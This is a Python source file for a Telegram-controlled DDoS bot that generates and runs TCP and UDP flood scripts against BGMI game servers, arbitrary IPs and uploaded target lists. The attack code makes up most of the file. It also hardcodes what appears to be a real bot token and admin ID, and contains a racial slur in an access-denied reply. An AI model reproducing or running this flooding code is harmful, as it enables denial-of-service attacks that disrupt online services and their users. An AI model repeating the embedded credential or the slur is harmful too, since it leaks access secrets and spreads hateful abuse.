# Add these imports at the top
import time
import subprocess
import json
from datetime import datetime
import telebot
import threading
import json
import time
import subprocess
import os
from ddos import BGMIDDOS

TOKEN = "8728086628:AAGacSuGZtVQtBmkwySyYcUlLkT5mGyvzns"
ADMIN_IDS = [6911928761]

bot = telebot.TeleBot(TOKEN)
ddos_engine = BGMIDDOS()

# File-based attack system
ATTACK_SCRIPT = "attack_runner.py"

# Update checking function
def check_update():
    """Check if update is available"""
    try:
        # Get current version
        with open("version.txt", "r") as f:
            current_version = f.read().strip()
        
        # Get latest version from GitHub (or version.txt)
        # For now, just return current
        return False, current_version
    except:
        return False, "1.0.0"

@bot.message_handler(commands=['start', 'help'])
def start(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Access denied, nigger!")
        return
    
    help_text = """
🟥 BGMI SERVER DDoS BOT 🟥

🔧 DIRECT ATTACK COMMANDS:
/ddos <ip> <port> <time> <threads>
Example: /ddos 45.76.156.194 80 300 500

/udp <ip> <port> <time>
Example: /udp 103.21.244.0 3074 60

/http <url> <time>
Example: /http bgmi.krafton.com 120

🎮 BGMI SPECIFIC:
/bgmi <region> <time>
Regions: asia, india, eu, na, me, sa
Example: /bgmi india 300

⚙️ CONTROL:
/stop - Stop all attacks
/status - Check active attacks
/targets - List BGMI servers
/nuke - Attack all servers

📁 FILE SYSTEM:
/upload - Upload target list
/runfile <filename> - Execute attack file

🔄 UPDATE SYSTEM:
/version - Check current version
/update - Update to latest version
/backup - Backup attack files
/monitor - Check bot status
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['ddos'])
def direct_ddos(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 5:
            bot.reply_to(message, "Usage: /ddos <IP> <PORT> <TIME> <THREADS>")
            return
        
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = int(parts[3])
        threads = int(parts[4])
        
        # Create attack file
        attack_code = f"""
import socket
import threading
import time
import random

target = "{target_ip}"
port = {target_port}
duration = {duration}
threads = {threads}

attack_active = True

def flood():
    while attack_active and time.time() < start_time + duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            
            # Send multiple packets
            for _ in range(100):
                s.send(random._urandom(1024))
            
            s.send(b"GET / HTTP/1.1\\r\\n")
            s.send(f"Host: {{target}}\\r\\n".encode())
            s.send(b"User-Agent: BGMI-DDoS-Bot\\r\\n\\r\\n")
            
            s.close()
        except:
            pass

start_time = time.time()
print(f"[+] Attacking {{target}}:{{port}} for {{duration}}s with {{threads}} threads")

# Start threads
thread_list = []
for i in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    thread_list.append(t)

time.sleep(duration)
attack_active = False
print("[!] Attack completed")
        """
        
        # Save and execute
        with open(ATTACK_SCRIPT, 'w') as f:
            f.write(attack_code)
        
        # Run in background
        def run_attack():
            subprocess.run(["python", ATTACK_SCRIPT])
        
        threading.Thread(target=run_attack).start()
        
        bot.reply_to(message, f"""
✅ DDoS Launched!
🎯 Target: {target_ip}:{target_port}
⏱️ Duration: {duration} seconds
🧵 Threads: {threads}
🔥 Type: TCP Flood
📊 Expected packets: ~{threads * 100 * duration}
        """)
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['bgmi'])
def bgmi_attack(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "Usage: /bgmi <region> <time>\nRegions: asia, india, eu, na, me, sa")
            return
        
        region = parts[1].lower()
        duration = int(parts[2])
        
        # Region to server mapping
        servers = {
            'asia': '45.76.156.194',
            'india': '103.21.244.0',
            'eu': '45.76.156.195',
            'na': '45.32.100.25',
            'me': '103.22.200.0',
            'sa': '45.76.156.196'
        }
        
        if region not in servers:
            bot.reply_to(message, "Invalid region! Use: asia, india, eu, na, me, sa")
            return
        
        target = servers[region]
        
        # Create BGMI-specific attack
        bgmi_attack = f"""
# BGMI Match Server Attack
import socket
import threading
import time

target = "{target}"
game_ports = [3074, 7777, 8080, 8443, 9000]  # Common game ports
duration = {duration}
threads_per_port = 100

def attack_game_port(port):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # UDP packets for game servers
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b'\\x00' * 512  # Empty game packets
            for _ in range(50):
                sock.sendto(data, (target, port))
            sock.close()
            
            # TCP connection attempts
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(1)
            sock2.connect((target, port))
            sock2.send(b"PING\\r\\n")
            sock2.close()
        except:
            pass

print(f"[BGMI] Attacking {{target}} for {{duration}}s")
threads = []
for port in game_ports:
    for i in range(threads_per_port):
        t = threading.Thread(target=attack_game_port, args=(port,))
        t.daemon = True
        t.start()
        threads.append(t)

time.sleep(duration)
print("[BGMI] Attack finished")
        """
        
        with open("bgmi_attack.py", 'w') as f:
            f.write(bgmi_attack)
        
        subprocess.Popen(["python", "bgmi_attack.py"])
        
        bot.reply_to(message, f"""
🎮 BGMI SERVER ATTACK!
📍 Region: {region.upper()}
🎯 Server: {target}
⏱️ Duration: {duration}s
📡 Ports: 3074,7777,8080,8443,9000
💥 Matchmaking will be disrupted
        """)
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['runfile'])
def run_file(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        filename = message.text.split()[1]
        if not os.path.exists(filename):
            bot.reply_to(message, f"File {filename} not found!")
            return
        
        # Execute the attack file
        result = subprocess.run(["python", filename], capture_output=True, text=True)
        
        if result.returncode == 0:
            bot.reply_to(message, f"✅ File executed successfully!\nOutput: {result.stdout[:500]}")
        else:
            bot.reply_to(message, f"❌ Execution failed!\nError: {result.stderr[:500]}")
            
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['upload'])
def upload_targets(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    bot.reply_to(message, """
📁 Upload your target list as a text file with format:
IP PORT TIME THREADS

Example file content:
45.76.156.194 80 300 500
103.21.244.0 3074 600 1000
bgmi.krafton.com 443 120 200

Send the file and I'll process it automatically.
    """)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open("targets.txt", 'wb') as f:
            f.write(downloaded_file)
        
        # Process targets
        with open("targets.txt", 'r') as f:
            targets = f.readlines()
        
        attack_count = 0
        for line in targets:
            if line.strip():
                parts = line.strip().split()
                if len(parts) >= 4:
                    ip, port, time_, threads = parts[0], parts[1], parts[2], parts[3]
                    
                    # Create attack for each target
                    attack_script = f"attack_{attack_count}.py"
                    with open(attack_script, 'w') as af:
                        af.write(f"""
import socket, threading, time
target = "{ip}"
port = {port}
for i in range({threads}):
    threading.Thread(target=lambda: [socket.socket().connect((target, port)) for _ in range(100)]).start()
time.sleep({time})
                        """)
                    
                    subprocess.Popen(["python", attack_script])
                    attack_count += 1
        
        bot.reply_to(message, f"✅ Uploaded and launched {attack_count} attacks!")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# Add these command handlers AFTER your existing commands
@bot.message_handler(commands=['version'])
def version_cmd(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Fuck off, you ain't admin!")
        return
    
    try:
        with open("version.txt", "r") as f:
            version = f.read().strip()
        
        # Read changelog if exists
        changelog_text = "No changelog available."
        if os.path.exists("changelog.md"):
            with open("changelog.md", "r") as f:
                changelog_text = f.read()
        
        # Get last 3 versions
        lines = changelog_text.split('\n')
        recent = []
        for line in lines:
            if line.startswith('## v'):
                recent.append(line)
                if len(recent) >= 3:
                    break
        
        response = f"""
📱 **BGMI DDoS Bot Version:** `{version}`

**Recent Updates:**
{chr(10).join(recent) if recent else 'No recent updates'}

**Commands:**
/update - Update to latest version
/backup - Backup attack files
/monitor - Check bot status
/bump - Bump version number

**Check for updates:** /update
"""
        bot.reply_to(message, response, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['update'])
def update_cmd(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    bot.reply_to(message, "🔄 Checking for updates...")
    
    try:
        # Run updater script
        result = subprocess.run(["python", "updater.py"], 
                              capture_output=True, 
                              text=True,
                              timeout=30)
        
        if result.returncode == 0:
            bot.reply_to(message, f"✅ Update successful!\n\nOutput:\n```\n{result.stdout[:1000]}\n```", 
                        parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ Update failed!\n\nError:\n```\n{result.stderr[:1000]}\n```", 
                        parse_mode='Markdown')
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "⚠️ Update timed out. Check manually.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['backup'])
def backup_cmd(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        result = subprocess.run(["python", "backup_attacks.py"], 
                              capture_output=True, 
                              text=True)
        
        if result.returncode == 0:
            bot.reply_to(message, f"✅ Backup created!\n\n{result.stdout}")
            
            # Send backup file if exists
            if os.path.exists("backup_latest.zip"):
                with open("backup_latest.zip", "rb") as f:
                    bot.send_document(message.chat.id, f, caption="📦 Latest backup file")
        else:
            bot.reply_to(message, f"❌ Backup failed!\n\n{result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['monitor'])
def monitor_cmd(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        result = subprocess.run(["python", "monitor.py"], 
                              capture_output=True, 
                              text=True)
        
        status = result.stdout if result.returncode == 0 else result.stderr
        
        bot.reply_to(message, f"📊 **Bot Monitor Status:**\n```\n{status[:1500]}\n```", 
                    parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['bump'])
def bump_cmd(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        # Get current version
        with open("version.txt", "r") as f:
            current = f.read().strip()
        
        # Ask for new version
        bot.reply_to(message, f"Current version: {current}\n\nSend new version (format: X.Y.Z):")
        
        # You need to handle the response - this is simplified
        # In real bot, use conversation handler
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# Enhanced check_update function for auto-updates
def enhanced_check_update():
    """Enhanced update check with actual GitHub API"""
    try:
        # Get current version
        with open("version.txt", "r") as f:
            current_version = f.read().strip()
        
        # Try to get latest version from GitHub API
        import requests
        try:
            response = requests.get(
                "https://api.github.com/repos/YOUR_USERNAME/YOUR_REPO/releases/latest",
                timeout=5
            )
            
            if response.status_code == 200:
                latest_version = response.json()['tag_name']
                
                # Simple version comparison (you might need a better method)
                if latest_version != current_version:
                    return True, latest_version
            
            return False, current_version
        except requests.RequestException:
            # Fallback to local check
            return False, current_version
            
    except Exception as e:
        print(f"[UPDATE] Error checking updates: {e}")
        return False, "unknown"

if __name__ == "__main__":
    print("🤖 BGMI DDoS Bot Started...")
    
    # Auto-update check variables
    last_update_check = time.time()
    UPDATE_INTERVAL = 86400  # 24 hours in seconds
    
    # Load config from file if exists
    AUTO_UPDATE = True
    NOTIFY_UPDATES = True
    
    config_file = "config.json"
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                AUTO_UPDATE = config.get('auto_update', True)
                NOTIFY_UPDATES = config.get('notify_updates', True)
                # Update ADMIN_IDS from config if present
                if 'admin_ids' in config:
                    ADMIN_IDS.extend(config['admin_ids'])
                    ADMIN_IDS = list(set(ADMIN_IDS))  # Remove duplicates
        except:
            pass
    
    # Start bot in separate thread for monitoring
    def bot_polling():
        print("[+] Bot polling started...")
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"[!] Bot polling error: {e}")
    
    bot_thread = threading.Thread(target=bot_polling)
    bot_thread.daemon = True
    bot_thread.start()
    
    print("[+] Bot started. Monitoring for updates...")
    
    # Main monitoring loop
    monitor_counter = 0
    while True:
        current_time = time.time()
        
        # Check for updates periodically
        if AUTO_UPDATE and (current_time - last_update_check > UPDATE_INTERVAL):
            try:
                update_needed, new_version = enhanced_check_update()
                if update_needed:
                    print(f"[UPDATE] New version available: {new_version}")
                    
                    if NOTIFY_UPDATES:
                        # Notify all admins
                        for admin_id in ADMIN_IDS:
                            try:
                                bot.send_message(
                                    admin_id,
                                    f"📢 Update available!\nNew version: {new_version}\nUse /update to install"
                                )
                                print(f"[UPDATE] Notification sent to admin {admin_id}")
                            except Exception as e:
                                print(f"[UPDATE] Failed to notify admin {admin_id}: {e}")
                
                last_update_check = current_time
            except Exception as e:
                print(f"[UPDATE] Error in update check: {e}")
        
        # Run monitor periodically (every hour)
        monitor_counter += 1
        if monitor_counter >= 3600:  # Every 3600 seconds = 1 hour
            try:
                print("[MONITOR] Running hourly check...")
                result = subprocess.run([sys.executable, "monitor.py"], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=60)
                if result.returncode == 0:
                    print(f"[MONITOR] Success: {result.stdout[:200]}")
                else:
                    print(f"[MONITOR] Failed: {result.stderr[:200]}")
                monitor_counter = 0
            except Exception as e:
                print(f"[MONITOR] Error: {e}")
        
        # Print status every 5 minutes (optional)
        if int(current_time) % 300 == 0:
            print(f"[STATUS] Bot running... Last update check: {time.ctime(last_update_check)}")
        
        time.sleep(60)  # Check every minute
